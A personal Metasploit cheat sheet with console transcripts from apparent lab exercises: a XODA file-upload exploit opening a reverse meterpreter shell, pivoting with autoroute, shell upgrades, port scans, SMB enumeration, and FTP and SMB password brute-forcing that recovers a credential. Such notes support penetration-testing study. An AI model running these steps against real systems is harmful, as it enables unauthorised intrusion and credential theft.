# Metasploit

## Interesting Stuff

### Setting autoroute

```bash
meterpreter > run autoroute -s 192.72.228.2

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 192.72.228.2/255.255.255.0...
[+] Added route to 192.72.228.2/255.255.255.0 via 192.241.114.3
[*] Use the -p option to list all active routes
```
### Port Forward

```bash
meterpreter > portfwd add -l 1234 -p 80 -r 10.4.31.201
[*] Local TCP relay created: :1234 <-> 10.4.31.201:80
```

### Exploit Suggester

```bash
msf6 > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits


View the full module info with the info, or info -d command.

msf6 post(multi/recon/local_exploit_suggester) > info

       Name: Multi Recon Local Exploit Suggester
     Module: post/multi/recon/local_exploit_suggester
   Platform: Apple_iOS, Hardware, Multi, Mainframe, Firefox, NodeJS, Python, JavaScript, PHP, Unix, Irix, HPUX, AIX, FreeBSD, NetBSD, BSDi, OpenBSD, BSD, OSX, Solaris, Arista, Mikrotik, Brocade, Unifi, Juniper, Cisco, Linux, Ruby, R, Java, Android, Netware, Windows, Unknown
       Arch: 
       Rank: Normal

Provided by:
  sinn3r <sinn3r@metasploit.com>
  Mo

Compatible session types:
  Meterpreter
  Shell

Basic options:
  Name             Current Setting  Required  Description
  ----             ---------------  --------  -----------
  SESSION                           yes       The session to run this module on
  SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

Description:
  This module suggests local meterpreter exploits that can be used.

  The exploits are suggested based on the architecture and platform
  that the user has a shell opened as well as the available exploits
  in meterpreter.

  It's important to note that not all local exploits will be fired.
  Exploits are chosen based on these conditions: session type,
  platform, architecture, and required default options.


View the full module info with the info -d command.
```

### Autopwn

[Autopwn](https://github.com/hahwul/metasploit-autopwn)

```bash
msf6 > db_autopwn -p -t -PI 445
```

### Convert Linux Shell to Meterpreter

```bash
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > use post/multi/manage/shell_to_meterpreter

msf5 post(multi/manage/shell_to_meterpreter) > options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on.

msf5 post(multi/manage/shell_to_meterpreter) > set LHOST 192.169.220.2
LHOST => 192.169.220.2

msf5 post(multi/manage/shell_to_meterpreter) > set SESSION 1
SESSION => 1

msf5 post(multi/manage/shell_to_meterpreter) > run

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.169.220.2:4433
[*] Sending stage (985320 bytes) to 192.169.220.3
[*] Meterpreter session 2 opened (192.169.220.2:4433 -> 192.169.220.3:56474) at 2024-02-07 11:29:53 +0000
[*] Post module execution completed
msf5 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

  Id  Name  Type                   Information  Connection
  --  ----  ----                   -----------  ----------
  1         shell cmd/unix                      192.169.220.2:43371 -> 192.169.220.3:6200 (192.169.220.3)
  2         meterpreter x86/linux               192.169.220.2:4433 -> 192.169.220.3:56474 (192.169.220.3)
```

### Get System in Windows

```bash
meterpreter > getsystem
```


## Random Notes

```bash
$ sudo systemctl enable postgresql
Synchronizing state of postgresql.service with SysV service script with /usr/lib/systemd/systemd-sysv-install.
Executing: /usr/lib/systemd/systemd-sysv-install enable postgresql
Created symlink /etc/systemd/system/multi-user.target.wants/postgresql.service → /usr/lib/systemd/system/postgresql.service.

$ sudo systemctl status postgresql
● postgresql.service - PostgreSQL RDBMS
     Loaded: loaded (/usr/lib/systemd/system/postgresql.service; enabled; preset: disabled)
     Active: active (exited) since Tue 2024-01-30 08:42:59 EST; 2min 4s ago
   Main PID: 25780 (code=exited, status=0/SUCCESS)
        CPU: 2ms

Jan 30 08:42:59 kali systemd[1]: Starting postgresql.service - PostgreSQL RDBMS...
Jan 30 08:42:59 kali systemd[1]: Finished postgresql.service - PostgreSQL RDBMS.
```

```bash
$ sudo msfdb init
[i] Database already started
[+] Creating database user 'msf'
[+] Creating databases 'msf'
[+] Creating databases 'msf_test'
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
[+] Creating initial database schema

$ sudo msfdb status
● postgresql.service - PostgreSQL RDBMS
     Loaded: loaded (/usr/lib/systemd/system/postgresql.service; enabled; preset: disabled)
     Active: active (exited) since Tue 2024-01-30 08:42:59 EST; 4min 42s ago
   Main PID: 25780 (code=exited, status=0/SUCCESS)
        CPU: 2ms

Jan 30 08:42:59 kali systemd[1]: Starting postgresql.service - PostgreSQL RDBMS...
Jan 30 08:42:59 kali systemd[1]: Finished postgresql.service - PostgreSQL RDBMS.

COMMAND    PID     USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
postgres 25701 postgres    5u  IPv6  61099      0t0  TCP localhost:5432 (LISTEN)
postgres 25701 postgres    6u  IPv4  61100      0t0  TCP localhost:5432 (LISTEN)

UID          PID    PPID  C STIME TTY      STAT   TIME CMD
postgres   25701       1  0 08:42 ?        Ss     0:00 /usr/lib/postgresql/14/bin/postgres -D /var/lib/postgresql/14/main -c config_file=/etc/postgresql/14/main/postgresql.conf

[+] Detected configuration file (/usr/share/metasploit-framework/config/database.yml)


# From msfconsole
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.
```

Search CVEs from 2023

```bash
search cve:2023 type:exploit platform:-windows
```

```bash
msf5 > search portscan

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/wordpress_pingback_access                   normal  No     Wordpress Pingback Locator
   1  auxiliary/scanner/natpmp/natpmp_portscan                           normal  No     NAT-PMP External Port Scanner
   2  auxiliary/scanner/portscan/ack                                     normal  No     TCP ACK Firewall Scanner
   3  auxiliary/scanner/portscan/ftpbounce                               normal  No     FTP Bounce Port Scanner
   4  auxiliary/scanner/portscan/syn                                     normal  No     TCP SYN Port Scanner
   5  auxiliary/scanner/portscan/tcp                                     normal  No     TCP Port Scanner
   6  auxiliary/scanner/portscan/xmas                                    normal  No     TCP "XMas" Port Scanner
   7  auxiliary/scanner/sap/sap_router_portscanner                       normal  No     SAPRouter Port Scanner


msf5 > use 5
msf5 auxiliary(scanner/portscan/tcp) > options

Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   DELAY        0                yes       The delay between connections, per thread, in milliseconds
   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   THREADS      1                yes       The number of concurrent threads (max one per host)
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds

msf5 auxiliary(scanner/portscan/tcp) > setg RHOSTS 192.241.114.3
RHOSTS => 192.241.114.3
msf5 auxiliary(scanner/portscan/tcp) > options

Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   DELAY        0                yes       The delay between connections, per thread, in milliseconds
   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS       192.241.114.3    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   THREADS      1                yes       The number of concurrent threads (max one per host)
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds

msf5 auxiliary(scanner/portscan/tcp) > run

[+] 192.241.114.3:        - 192.241.114.3:80 - TCP OPEN
[*] 192.241.114.3:        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

msf5 auxiliary(scanner/portscan/tcp) > curl 192.241.114.3
[*] exec: curl 192.241.114.3

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
        <title>XODA</title>
                <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
                        <script language="JavaScript" type="text/javascript">
                        //<![CDATA[
                        var countselected=0;
                        function stab(id){var _10=new Array();for(i=0;i<_10.length;i++){document.getElementById(_10[i]).className="tab";}document.getElementById(id).className="stab";}var allfiles=new Array('');
                        //]]>
                </script>
                <script language="JavaScript" type="text/javascript" src="/js/xoda.js"></script>
                <script language="JavaScript" type="text/javascript" src="/js/sorttable.js"></script>
                <link rel="stylesheet" href="/style.css" type="text/css" />
</head>

<body onload="document.lform.username.focus();">
        <div id="top">
                <a href="/" title="XODA"><span style="color: #56a;">XO</span><span style="color: #fa5;">D</span><span style="color: #56a;">A</span></a>
                        </div>
        <form method="post" action="/?log_in" name="lform" id="login">
                <p>Username:&nbsp;<input type="text" id="un" name="username" /></p>
                <p>Password:&nbsp;<input type="password" name="password" /></p>
                <p><input type="submit" name="submit" value="login" /></p>
        </form>
</body>
</html>
        msf5 auxiliary(scanner/portscan/tcp) > search xoda

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/webapp/xoda_file_upload  2012-08-21       excellent  Yes    XODA 0.4.5 Arbitrary PHP File Upload Vulnerability


msf5 auxiliary(scanner/portscan/tcp) > use 0

msf5 exploit(unix/webapp/xoda_file_upload) > options

Module options (exploit/unix/webapp/xoda_file_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.241.114.3    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /xoda/           yes       The base path to the web application
   VHOST                       no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   XODA 0.4.5

msf5 exploit(unix/webapp/xoda_file_upload) > set TARGETURI /
TARGETURI => /
msf5 exploit(unix/webapp/xoda_file_upload) > run

[*] Started reverse TCP handler on 192.241.114.2:4444
[*] Sending PHP payload (sjzhUowdL.php)
[*] Executing PHP payload (sjzhUowdL.php)
[*] Sending stage (38288 bytes) to 192.241.114.3
[*] Meterpreter session 1 opened (192.241.114.2:4444 -> 192.241.114.3:45140) at 2024-01-31 12:49:52 +0000
[!] Deleting sjzhUowdL.php

meterpreter > sysinfo
Computer    : victim-1
OS          : Linux victim-1 5.4.0-152-generic #169-Ubuntu SMP Tue Jun 6 22:23:09 UTC 2023 x86_64
Meterpreter : php/linux

meterpreter > getuid
Server username: www-data (33)

meterpreter > shell
Process 794 created.
Channel 1 created.

/bin/bash -i
bash: cannot set terminal process group (426): Inappropriate ioctl for device
bash: no job control in this shell

www-data@victim-1:/app/files$ ifconfig
ifconfig
eth0      Link encap:Ethernet  HWaddr 02:42:c0:f1:72:03
          inet addr:192.241.114.3  Bcast:192.241.114.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:11650 errors:0 dropped:0 overruns:0 frame:0
          TX packets:11087 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:917306 (917.3 KB)  TX bytes:615920 (615.9 KB)

eth1      Link encap:Ethernet  HWaddr 02:42:c0:48:e4:02
          inet addr:192.72.228.2  Bcast:192.72.228.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:20 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:1712 (1.7 KB)  TX bytes:0 (0.0 B)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)

www-data@victim-1:/app/files$ exit
exit


meterpreter > run autoroute -s 192.72.228.2

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 192.72.228.2/255.255.255.0...
[+] Added route to 192.72.228.2/255.255.255.0 via 192.241.114.3
[*] Use the -p option to list all active routes

meterpreter > background
[*] Backgrounding session 1...
msf5 exploit(unix/webapp/xoda_file_upload) > sessions

Active sessions
===============

  Id  Name  Type                   Information               Connection
  --  ----  ----                   -----------               ----------
  1         meterpreter php/linux  www-data (33) @ victim-1  192.241.114.2:4444 -> 192.241.114.3:45140 (192.241.114.3)


msf5 exploit(unix/webapp/xoda_file_upload) > search portscan

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/wordpress_pingback_access                   normal  No     Wordpress Pingback Locator
   1  auxiliary/scanner/natpmp/natpmp_portscan                           normal  No     NAT-PMP External Port Scanner
   2  auxiliary/scanner/portscan/ack                                     normal  No     TCP ACK Firewall Scanner
   3  auxiliary/scanner/portscan/ftpbounce                               normal  No     FTP Bounce Port Scanner
   4  auxiliary/scanner/portscan/syn                                     normal  No     TCP SYN Port Scanner
   5  auxiliary/scanner/portscan/tcp                                     normal  No     TCP Port Scanner
   6  auxiliary/scanner/portscan/xmas                                    normal  No     TCP "XMas" Port Scanner
   7  auxiliary/scanner/sap/sap_router_portscanner                       normal  No     SAPRouter Port Scanner


msf5 exploit(unix/webapp/xoda_file_upload) > use 5
msf5 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.72.228.3
RHOSTS => 192.72.228.3

msf5 auxiliary(scanner/portscan/tcp) > run

[+] 192.72.228.3:         - 192.72.228.3:21 - TCP OPEN
[+] 192.72.228.3:         - 192.72.228.3:22 - TCP OPEN
[+] 192.72.228.3:         - 192.72.228.3:80 - TCP OPEN
```

UPD Scan

```bash
msf5 auxiliary(scanner/portscan/tcp) > search udp_sweep

Matching Modules
================

   #  Name                                   Disclosure Date  Rank    Check  Description
   -  ----                                   ---------------  ----    -----  -----------
   0  auxiliary/scanner/discovery/udp_sweep                   normal  No     UDP Service Sweeper


msf5 auxiliary(scanner/portscan/tcp) > use 0
msf5 auxiliary(scanner/discovery/udp_sweep) > options

Module options (auxiliary/scanner/discovery/udp_sweep):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to probe in each set
   RHOSTS     192.241.114.3    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   THREADS    10               yes       The number of concurrent threads

msf5 auxiliary(scanner/discovery/udp_sweep) > run

[*] Sending 13 probes to 192.241.114.3->192.241.114.3 (1 hosts)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### FTP Enum

```bash
msf5 > search portscan

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   1  auxiliary/scanner/http/wordpress_pingback_access                   normal  Yes    Wordpress Pingback Locator
   2  auxiliary/scanner/natpmp/natpmp_portscan                           normal  Yes    NAT-PMP External Port Scanner
   3  auxiliary/scanner/portscan/ack                                     normal  Yes    TCP ACK Firewall Scanner
   4  auxiliary/scanner/portscan/ftpbounce                               normal  Yes    FTP Bounce Port Scanner
   5  auxiliary/scanner/portscan/syn                                     normal  Yes    TCP SYN Port Scanner
   6  auxiliary/scanner/portscan/tcp                                     normal  Yes    TCP Port Scanner
   7  auxiliary/scanner/portscan/xmas                                    normal  Yes    TCP "XMas" Port Scanner
   8  auxiliary/scanner/sap/sap_router_portscanner                       normal  No     SAPRouter Port Scanner


msf5 > use auxiliary/scanner/portscan/tcp
msf5 auxiliary(scanner/portscan/tcp) > options

Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   DELAY        0                yes       The delay between connections, per thread, in milliseconds
   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS                        yes       The target address range or CIDR identifier
   THREADS      1                yes       The number of concurrent threads
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds

msf5 auxiliary(scanner/portscan/tcp) > setg RHOSTS 192.244.108.3
RHOSTS => 192.244.108.3

msf5 auxiliary(scanner/portscan/tcp) > run

[+] 192.244.108.3:        - 192.244.108.3:21 - TCP OPEN
[*] 192.244.108.3:        - Scanned 1 of 1

msf5 auxiliary(scanner/portscan/tcp) > search type:auxiliary name:ftp

Matching Modules
================

   #   Name                                              Disclosure Date  Rank    Check  Description
   -   ----                                              ---------------  ----    -----  -----------
   1   auxiliary/admin/cisco/vpn_3000_ftp_bypass         2006-08-23       normal  No     Cisco VPN Concentrator 3000 FTP Unauthorized Administrative Access
   2   auxiliary/admin/tftp/tftp_transfer_util                            normal  No     TFTP File Transfer Utility
   3   auxiliary/dos/scada/d20_tftp_overflow             2012-01-19       normal  No     General Electric D20ME TFTP Server Buffer Overflow DoS
   4   auxiliary/dos/windows/ftp/filezilla_admin_user    2005-11-07       normal  No     FileZilla FTP Server Admin Interface Denial of Service
   5   auxiliary/dos/windows/ftp/filezilla_server_port   2006-12-11       normal  No     FileZilla FTP Server Malformed PORT Denial of Service
...

msf5 auxiliary(scanner/portscan/tcp) > use auxiliary/scanner/ftp/ftp_version
msf5 auxiliary(scanner/ftp/ftp_version) > options

Module options (auxiliary/scanner/ftp/ftp_version):

   Name     Current Setting      Required  Description
   ----     ---------------      --------  -----------
   FTPPASS  mozilla@example.com  no        The password for the specified username
   FTPUSER  anonymous            no        The username to authenticate as
   RHOSTS   192.244.108.3        yes       The target address range or CIDR identifier
   RPORT    21                   yes       The target port (TCP)
   THREADS  1                    yes       The number of concurrent threads

msf5 auxiliary(scanner/ftp/ftp_version) > run

[+] 192.244.108.3:21      - FTP Banner: '220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.244.108.3]\x0d\x0a'
[*] 192.244.108.3:21      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

msf5 auxiliary(scanner/ftp/ftp_version) > use auxiliary/scanner/ftp/ftp_login
msf5 auxiliary(scanner/ftp/ftp_login) > options

Module options (auxiliary/scanner/ftp/ftp_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]
   RECORD_GUEST      false            no        Record anonymous/guest logins to the database
   RHOSTS            192.244.108.3    yes       The target address range or CIDR identifier
   RPORT             21               yes       The target port (TCP)
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           true             yes       Whether to print output for all attempts

msf5 auxiliary(scanner/ftp/ftp_login) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
USER_FILE => /usr/share/metasploit-framework/data/wordlists/common_users.txt

msf5 auxiliary(scanner/ftp/ftp_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
PASS_FILE => /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

msf5 auxiliary(scanner/ftp/ftp_login) > run

[*] 192.244.108.3:21      - 192.244.108.3:21 - Starting FTP login sweep
[-] 192.244.108.3:21      - 192.244.108.3:21 - LOGIN FAILED: sysadmin:admin (Incorrect: )
[-] 192.244.108.3:21      - 192.244.108.3:21 - LOGIN FAILED: sysadmin:123456 (Incorrect: )
[-] 192.244.108.3:21      - 192.244.108.3:21 - LOGIN FAILED: sysadmin:12345 (Incorrect: )
[-] 192.244.108.3:21      - 192.244.108.3:21 - LOGIN FAILED: sysadmin:123456789 (Incorrect: )
[-] 192.244.108.3:21      - 192.244.108.3:21 - LOGIN FAILED: sysadmin:password (Incorrect: )
[-] 192.244.108.3:21      - 192.244.108.3:21 - LOGIN FAILED: sysadmin:iloveyou (Incorrect: )
[-] 192.244.108.3:21      - 192.244.108.3:21 - LOGIN FAILED: sysadmin:princess (Incorrect: )
[-] 192.244.108.3:21      - 192.244.108.3:21 - LOGIN FAILED: sysadmin:1234567 (Incorrect: )
[-] 192.244.108.3:21      - 192.244.108.3:21 - LOGIN FAILED: sysadmin:12345678 (Incorrect: )
[-] 192.244.108.3:21      - 192.244.108.3:21 - LOGIN FAILED: sysadmin:abc123 (Incorrect: )
[-] 192.244.108.3:21      - 192.244.108.3:21 - LOGIN FAILED: sysadmin:nicole (Incorrect: )
[-] 192.244.108.3:21      - 192.244.108.3:21 - LOGIN FAILED: sysadmin:daniel (Incorrect: )
[-] 192.244.108.3:21      - 192.244.108.3:21 - LOGIN FAILED: sysadmin:babygirl (Incorrect: )
[-] 192.244.108.3:21      - 192.244.108.3:21 - LOGIN FAILED: sysadmin:monkey (Incorrect: )
[-] 192.244.108.3:21      - 192.244.108.3:21 - LOGIN FAILED: sysadmin:lovely (Incorrect: )
[-] 192.244.108.3:21      - 192.244.108.3:21 - LOGIN FAILED: sysadmin:jessica (Incorrect: )
[+] 192.244.108.3:21      - 192.244.108.3:21 - Login Successful: sysadmin:654321
[-] 192.244.108.3:21      - 192.244.108.3:21 - LOGIN FAILED: rooty:admin (Incorrect: )
[-] 192.244.108.3:21      - 192.244.108.3:21 - LOGIN FAILED: rooty:123456 (Incorrect: )
[-] 192.244.108.3:21      - 192.244.108.3:21 - LOGIN FAILED: rooty:12345 (Incorrect: )
[-] 192.244.108.3:21      - 192.244.108.3:21 - LOGIN FAILED: rooty:123456789 (Incorrect: )
[-] 192.244.108.3:21      - 192.244.108.3:21 - LOGIN FAILED: rooty:password (Incorrect: )
^C[*] 192.244.108.3:21      - Caught interrupt from the console...
[*] Auxiliary module execution completed

msf5 auxiliary(scanner/ftp/ftp_login) > use auxiliary/scanner/ftp/anonymous
msf5 auxiliary(scanner/ftp/anonymous) > options

Module options (auxiliary/scanner/ftp/anonymous):

   Name     Current Setting      Required  Description
   ----     ---------------      --------  -----------
   FTPPASS  mozilla@example.com  no        The password for the specified username
   FTPUSER  anonymous            no        The username to authenticate as
   RHOSTS   192.244.108.3        yes       The target address range or CIDR identifier
   RPORT    21                   yes       The target port (TCP)
   THREADS  1                    yes       The number of concurrent threads

msf5 auxiliary(scanner/ftp/anonymous) > run

[*] 192.244.108.3:21      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### SMB Enum

```bash
msf5 auxiliary(scanner/portscan/tcp) > use auxiliary/scanner/smb/smb_version
msf5 auxiliary(scanner/smb/smb_version) > options

Module options (auxiliary/scanner/smb/smb_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS     192.46.115.3     yes       The target address range or CIDR identifier
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass                     no        The password for the specified username
   SMBUser                     no        The username to authenticate as
   THREADS    1                yes       The number of concurrent threads

msf5 auxiliary(scanner/smb/smb_version) > run

[*] 192.46.115.3:445      - Host could not be identified: Windows 6.1 (Samba 4.3.11-Ubuntu)
[*] 192.46.115.3:445      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

msf5 auxiliary(scanner/smb/smb_version) > use auxiliary/scanner/smb/smb_enumusers
msf5 auxiliary(scanner/smb/smb_enumusers) > options

Module options (auxiliary/scanner/smb/smb_enumusers):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS     192.46.115.3     yes       The target address range or CIDR identifier
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass                     no        The password for the specified username
   SMBUser                     no        The username to authenticate as
   THREADS    1                yes       The number of concurrent threads

msf5 auxiliary(scanner/smb/smb_enumusers) > run

[+] 192.46.115.3:139      - SAMBA-RECON [ john, elie, aisha, shawn, emma, admin ] ( LockoutTries=0 PasswordMin=5 )
[*] 192.46.115.3:         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed


msf5 auxiliary(scanner/smb/smb_enumusers) > use auxiliary/scanner/smb/smb_enumshares
msf5 auxiliary(scanner/smb/smb_enumshares) > info

       Name: SMB Share Enumeration
     Module: auxiliary/scanner/smb/smb_enumshares
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  hdm <x@hdm.io>
  nebulus
  sinn3r <sinn3r@metasploit.com>
  r3dy
  altonjx

Check supported:
  Yes

Basic options:
  Name            Current Setting  Required  Description
  ----            ---------------  --------  -----------
  LogSpider       3                no        0 = disabled, 1 = CSV, 2 = table (txt), 3 = one liner (txt) (Accepted: 0, 1, 2, 3)
  MaxDepth        999              yes       Max number of subdirectories to spider
  RHOSTS          192.46.115.3     yes       The target address range or CIDR identifier
  SMBDomain       .                no        The Windows domain to use for authentication
  SMBPass                          no        The password for the specified username
  SMBUser                          no        The username to authenticate as
  ShowFiles       false            yes       Show detailed information when spidering
  SpiderProfiles  true             no        Spider only user profiles when share = C$
  SpiderShares    false            no        Spider shares recursively
  THREADS         1                yes       The number of concurrent threads

Description:
  This module determines what shares are provided by the SMB service
  and which ones are readable/writable. It also collects additional
  information such as share types, directories, files, time stamps,
  etc. By default, a netshareenum request is done in order to retrieve
  share information, but if this fails, you may also fall back to
  SRVSVC.

msf5 auxiliary(scanner/smb/smb_enumshares) > set ShowFiles true
ShowFiles => true

msf5 auxiliary(scanner/smb/smb_enumshares) > run

[+] 192.46.115.3:139      - public - (DS)
[+] 192.46.115.3:139      - john - (DS)
[+] 192.46.115.3:139      - aisha - (DS)
[+] 192.46.115.3:139      - emma - (DS)
[+] 192.46.115.3:139      - everyone - (DS)
[+] 192.46.115.3:139      - IPC$ - (I) IPC Service (samba.recon.lab)
[*] 192.46.115.3:         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

msf5 auxiliary(scanner/smb/smb_enumshares) > use auxiliary/scanner/smb/smb_login
msf5 auxiliary(scanner/smb/smb_login) > info

       Name: SMB Login Check Scanner
     Module: auxiliary/scanner/smb/smb_login
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  tebo <tebo@attackresearch.com>
  Ben Campbell <eat_meatballs@hotmail.co.uk>
  Brandon McCann "zeknox" <bmccann@accuvant.com>
  Tom Sellers <tom@fadedcode.net>

Check supported:
  Yes

Basic options:
  Name               Current Setting  Required  Description
  ----               ---------------  --------  -----------
  ABORT_ON_LOCKOUT   false            yes       Abort the run when an account lockout is detected
  BLANK_PASSWORDS    false            no        Try blank passwords for all users
  BRUTEFORCE_SPEED   5                yes       How fast to bruteforce, from 0 to 5
  DB_ALL_CREDS       false            no        Try each user/password couple stored in the current database
  DB_ALL_PASS        false            no        Add all passwords in the current database to the list
  DB_ALL_USERS       false            no        Add all users in the current database to the list
  DETECT_ANY_AUTH    false            no        Enable detection of systems accepting any authentication
  DETECT_ANY_DOMAIN  false            no        Detect if domain is required for the specified user
  PASS_FILE                           no        File containing passwords, one per line
  PRESERVE_DOMAINS   true             no        Respect a username that contains a domain name.
  Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
  RECORD_GUEST       false            no        Record guest-privileged random logins to the database
  RHOSTS             192.46.115.3     yes       The target address range or CIDR identifier
  RPORT              445              yes       The SMB service port (TCP)
  SMBDomain          .                no        The Windows domain to use for authentication
  SMBPass                             no        The password for the specified username
  SMBUser                             no        The username to authenticate as
  STOP_ON_SUCCESS    false            yes       Stop guessing when a credential works for a host
  THREADS            1                yes       The number of concurrent threads
  USERPASS_FILE                       no        File containing users and passwords separated by space, one pair per line
  USER_AS_PASS       false            no        Try the username as the password for all users
  USER_FILE                           no        File containing usernames, one per line
  VERBOSE            true             yes       Whether to print output for all attempts

Description:
  This module will test a SMB login on a range of machines and report
  successful logins. If you have loaded a database plugin and
  connected to a database this module will record successful logins
  and hosts so you can track your access.

References:
  https://cvedetails.com/cve/CVE-1999-0506/


msf5 auxiliary(scanner/smb/smb_login) > set SMBUser admin
SMBUser => admin

msf5 auxiliary(scanner/smb/smb_login) > set PASS_FiLE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
PASS_FiLE => /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

msf5 auxiliary(scanner/smb/smb_login) > run

[*] 192.46.115.3:445      - 192.46.115.3:445 - Starting SMB login bruteforce
[-] 192.46.115.3:445      - 192.46.115.3:445 - Failed: '.\admin:admin',
[-] 192.46.115.3:445      - 192.46.115.3:445 - Failed: '.\admin:123456',
